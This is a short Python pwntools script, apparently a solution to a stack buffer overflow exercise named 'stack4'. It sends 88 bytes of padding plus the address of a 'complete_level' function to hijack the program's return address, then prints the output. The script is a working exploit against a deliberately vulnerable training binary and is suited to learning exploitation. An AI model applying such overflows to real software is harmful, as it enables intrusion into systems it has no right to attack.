from pwn import *

filename = './stack4'
context.binary = ELF(path=filename)


p = process(filename)

p.sendline(b"A" * 64 + b"A" * 24 + p64(context.binary.sym["complete_level"]))


for i in range (0, 100):
    res = p.recvline(timeout=2)
    print(res)